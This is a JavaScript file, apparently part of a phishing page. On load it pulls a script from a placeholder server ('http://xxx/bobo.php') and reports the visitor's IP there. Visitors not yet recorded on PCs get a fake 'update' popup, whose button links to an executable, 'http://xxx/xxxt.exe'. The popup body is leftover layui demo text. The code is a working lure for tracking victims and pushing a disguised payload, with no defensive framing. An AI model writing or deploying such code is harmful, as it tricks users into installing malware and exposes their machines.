var returnCitySN = {"cip": "0.0.0.0", "bobo": "000000"};
document.write("<script src='http://xxx/bobo.php?getaddr=123'></script>");


function set_cookie() {
    var xmlHttp;
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest();
    } else {
        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlHttp.open("GET", "http://xxx/bobo.php?bobo=1", "true");
    xmlHttp.send();
    xmlHttp.onreadystatechange = function() {
        //alert(xmlHttp.responseText)
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
            var resData = xmlHttp.responseText;

        }
    }
}
//上线检测
function isRise(ip,bobo) {
    var xmlHttp;
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest();
    } else {
        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlHttp.open("GET", "http://xxx/bobo.php?search="+ip, "true");
    xmlHttp.send();
    xmlHttp.onreadystatechange = function() {
		//alert(xmlHttp.responseText)
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
            var resData = xmlHttp.responseText;
            if (resData == "in" && bobo == "111111") {
            } else {
                set_cookie();
                download();
            }
        }
    }
}
//下载
function download(){
layui.use('layer', function(){ //独立版的layer无需执行这一句
  var $ = layui.jquery, layer = layui.layer; //独立版的layer无需执行这一句
      //示范一个公告层
      layer.open({
        type: 1
        ,title: '更新提示' //不显示标题栏
        ,closeBtn: false
        ,area: '300px;'
        ,shade: 0.8
        ,id: 'LAY_layuipro' //设定一个id，防止重复弹出
        ,btn: ['更新', '下次再说']
        ,btnAlign: 'c'
        ,moveType: 1 //拖拽模式，0或者1
        ,content: '<div style="padding: 30px; line-height: 22px; background-color: #393D49; color: #fff; font-weight: 300;">你知道吗？亲！<br>layer ≠ layui<br><br>layer只是作为Layui的一个弹层模块，由于其用户基数较大，所以常常会有人以为layui是layerui<br><br>layer虽然已被 Layui 收编为内置的弹层模块，但仍然会作为一个独立组件全力维护、升级。<br><br>我们此后的征途是星辰大海 ^_^</div>'
        ,success: function(layero){
          var btn = layero.find('.layui-layer-btn');
          btn.find('.layui-layer-btn0').attr({
            href: 'http://xxx/xxxt.exe'
            ,target: '_blank' //新窗口显示
          });
          btn.find('.layui-layer-btn1').attr({
            href: 'login.php?action=logout'
          });
        }
      });
  });
}

//判断是否是PC
function isPc() {
    if (navigator.userAgent.match(/(iPhone|Android)/i)) {
        return false;
    } else {
        return true;
    }
}

//load,ipbase64编码后,传递给后端
window.onload = function(){
    if(!isPc()){
        alert("当前页面只能在电脑PC端中加载,请稍后重试...");
    }else{
        isRise(returnCitySN["cip"], returnCitySN["bobo"]);
    }
}
